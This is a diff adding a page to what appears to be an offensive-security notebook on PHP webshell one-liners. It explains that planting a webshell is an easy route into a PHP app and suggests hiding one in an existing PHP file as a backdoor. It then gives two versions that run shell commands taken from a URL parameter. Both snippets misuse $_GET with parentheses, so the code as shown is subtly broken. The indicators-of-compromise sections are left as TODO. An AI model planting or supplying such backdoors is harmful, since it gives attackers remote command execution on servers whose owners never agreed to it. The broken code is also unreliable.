@@ -382,13 +382,24 @@ stty rows &lt;rows&gt; cols &lt;columns&gt;
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="basic-php-webshell-oneliner"><a class="header" href="#basic-php-webshell-oneliner">Basic PHP Webshell Oneliner</a></h1>
 <h2 id="summary-4"><a class="header" href="#summary-4">Summary</a></h2>
+<p>One of the easiest methods to obtain access to a PHP enabled app, is to somehow plant a webshell onto the server. There are many fancy PHP webshells out there, but this page will cover a basic one that is easy to remember and type, and is easy to embed into an existing PHP file as a backdoor.</p>
 <h2 id="prerequisites-4"><a class="header" href="#prerequisites-4">Prerequisites</a></h2>
+<p>A PHP enabled server, typically apache.</p>
 <h2 id="setup-4"><a class="header" href="#setup-4">Setup</a></h2>
+<p>To set this up, all that is needed is access to a PHP enabled server somehow. This can be through a vulnerability or any other type of access.</p>
 <h2 id="execution-4"><a class="header" href="#execution-4">Execution</a></h2>
 <h3 id="method-1---shortest-possible"><a class="header" href="#method-1---shortest-possible">Method 1 - Shortest Possible</a></h3>
+<p>This is the shortest possible PHP webshell, the output from commands ran are not very pretty and will likely get mangled:</p>
+<pre><code class="language-php">&lt;?php system($_GET('cmd')); ?&gt;
+</code></pre>
 <h4 id="indicators-of-compromise-7"><a class="header" href="#indicators-of-compromise-7">Indicators of Compromise</a></h4>
+<p>TODO</p>
 <h3 id="method-2---slightly-prettier"><a class="header" href="#method-2---slightly-prettier">Method 2 - Slightly Prettier</a></h3>
+<p>This basic webshell wraps the output of the command into HTML pre tags, this will usually help prevent the output of the command from being mangled on the page.</p>
+<pre><code class="language-php">&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET('cmd')); echo &quot;&lt;/pre&gt;&quot;; ?&gt;
+</code></pre>
 <h4 id="indicators-of-compromise-8"><a class="header" href="#indicators-of-compromise-8">Indicators of Compromise</a></h4>
+<p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="linux"><a class="header" href="#linux">Linux</a></h1>
 <ul>
 <li><a href="./LINUX_PRIVESC_SUMMARY.html">Privilege Escalation</a>
